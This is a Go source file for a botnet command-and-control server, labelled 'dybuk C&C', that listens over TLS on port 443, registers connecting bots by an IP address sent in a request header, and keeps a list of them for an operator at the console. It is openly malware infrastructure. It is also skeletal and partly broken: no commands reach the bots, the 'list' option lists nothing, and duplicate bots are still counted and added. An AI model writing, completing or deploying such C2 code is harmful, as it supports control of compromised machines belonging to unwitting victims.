//C&C server, multithreaded for interacting
//with bots 
package main

import (
    "fmt"
    "log"
    "net/http"
    "strconv"
	"sync"
	"bufio"
	"os"
	"strings"
	"github.com/fatih/color"


)

var counter int
var mutex = &sync.Mutex{}

//list of bots
type bot_list struct { 
	num_bots int
	listofbots []bot
	
}

//individual bot
type bot struct { 
	number int
	ip_address string


}

var list bot_list = bot_list{num_bots:0}

func check_dup_bot(ip string)bool {
	for _, bots := range list.listofbots {
		if (bots.ip_address == ip) { 
			return false
		}
		
	}
	return true
}

//create a new bot
//TODO: have the bot send its ip address as well
//check for duplicate bots
func new_bot(number int, ip string) *bot { 
	b := bot{number:number}
	if (!check_dup_bot(ip)) {
		fmt.Println("bot ", ip, " is already present in the list...\n")
		b.ip_address = "empty"
		return &b

	} else { 
		b.ip_address = ip
		return &b
	}	
}

//when a bot connects, update the bot list
func bot_connect(w http.ResponseWriter, r *http.Request){
			fmt.Fprintf(w, "hello")
			fmt.Println("connecting new bot...")
			ip := strings.Join(r.Header["Data"], "")
			list.num_bots = list.num_bots + 1
			create_bot := new_bot(list.num_bots, ip)
			fmt.Println("current number of bots: ", list.num_bots)
			list.listofbots = append(list.listofbots, *create_bot)
			fmt.Println("current bots: ", list.listofbots)
			
}



func incrementCounter(w http.ResponseWriter, r *http.Request) {
    mutex.Lock()
    counter++
    fmt.Fprintf(w, strconv.Itoa(counter))
    mutex.Unlock()
}

//multithreaded server listen
func mt_listen_server() { 
	log.Fatal(http.ListenAndServeTLS(":443", "ldaplocal.pem", "ldaplocal.pem", nil))
}

func main() {

	color.Cyan("dybuk C&C")
	color.Green("Options:\n")
	color.Green("list - lists the bots and their ip addresses")
	color.Red("Listening for bots...")
	//fmt.Println(bot_list{num_bots: 0})
	//list_init := bot_list{num_bots:0}	
	http.HandleFunc("/", bot_connect)
	
    http.HandleFunc("/increment", incrementCounter)

    http.HandleFunc("/hi", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "Hi")
    })

	go mt_listen_server()
	
	//read input while listening for connections.
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		fmt.Println("you entered: ", scanner.Text())
		if (scanner.Text() == "list") { 
			fmt.Println("list command\n")
		}
	}

	if scanner.Err() != nil {
    	fmt.Println("error reading input...\n")
	}
}